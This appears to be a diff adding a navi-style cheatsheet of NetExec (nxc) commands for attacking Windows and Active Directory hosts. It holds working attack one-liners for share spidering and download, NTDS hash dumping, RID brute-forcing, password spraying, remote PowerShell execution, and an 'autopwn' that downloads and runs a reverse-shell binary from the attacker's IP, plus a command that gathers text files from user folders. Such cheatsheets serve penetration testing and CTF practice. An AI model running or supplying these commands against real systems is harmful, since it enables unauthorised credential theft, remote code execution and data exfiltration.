@@ -1,0 +1,66 @@
+% nxc, netexec
+@ windows-variables
+
+# netexec
+<nxc>
+
+# nxc smb
+<nxc_smb>
+
+# nxc winrm
+<nxc_winrm>
+
+# list shares
+<nxc_smb> --shares
+
+# spider shares
+<nxc_smb> -M spider_plus
+
+# spider download
+<nxc_smb> -M spider_plus -o DOWNLOAD_FLAG=True
+
+# dump DC user hash
+<nxc_smb> --ntds --user '<user>'
+
+# RID brute
+nxc smb '<ip_or_fqdn>' -u '<user_with_password>' -p '<password_for_user>' --rid-brute 10000 --log rid-brute.log
+
+# RID brute to windows yaml users
+windows-yaml.sh addusers <(cat rid-brute.log | grep SidTypeUser | awk '{print $13}' | awk -F\\ '{print $2}')
+
+# Password spray
+windows-yaml.sh writelist && nxc smb .ips --continue-on-success -u .users -p .passwords
+
+# pass = user spray
+windows-yaml.sh writelist && cat .users | sed -E 's/[^\\]*\\//' > .passwords && nxc smb .ips --continue-on-success -u .users -p .passwords
+
+# LDAP query
+<nxc_ldap> --query '<query>' ""
+
+# smb powershell command
+<nxc_smb> -x 'powershell -enc <pwshcustomenc>'
+$ pwshcustomenc: echo '<pwshcmd>' | iconv -t utf-16le | base64 -w 0
+
+# smb rssh autopwn
+<nxc_smb> -x 'powershell -enc <pwshrsshenc>'
+
+# winrm rssh autopwn
+<nxc_winrm> -x 'powershell -enc <pwshrsshenc>'
+
+$ interface: ip link show | awk -F': ' '{print $2}' | grep .
+$ external_ip: ip -f inet addr show <interface> | awk '/inet / {print $2}' | cut -d'/' -f1
+$ payload: echo 'C:\ProgramData\rssh'$(head -c 8 /dev/urandom | xxd -p).exe
+$ pwshrssh: echo 'IWR -OutFile <payload> http://<external_ip>:3232/rssh.exe; <payload>'
+$ pwshrsshenc: echo '<pwshrssh>' | iconv -t utf-16le | base64 -w 0
+
+# smb exfil flags
+<nxc_smb> -x 'powershell -enc <pwshexfilflagenc>'
+$ pwshexfilflagenc: echo 'gci C:\Users -Include *.txt -Recurse | cat' | iconv -t utf-16le | base64 -w 0
+
+$ proto: nxc --help | grep 'own stuff using' | awk '{print $1}'
+$ auth_method: if [[ -f windows.yaml ]]; then USER='<user_with_auth_method>' yq '.users[] | select(.username == strenv(USER)) | .t = "" | with(select(.password != null); .t = "-p '"'"'" + .password + "'"'"'") | with(select(.password == null and .nt_hash != null); .t = "-H " + .nt_hash) | .t' windows.yaml; fi
+$ nxc_target_and_auth: echo "'<ip_or_fqdn_or_list>' -u '<user_with_auth_method>' <auth_method>"
+$ nxc: echo "nxc <proto> <nxc_target_and_auth>"
+$ nxc_smb: echo "nxc smb <nxc_target_and_auth>"
+$ nxc_ldap: echo "nxc ldap <nxc_target_and_auth>"
+$ nxc_winrm: echo "nxc winrm <nxc_target_and_auth>"
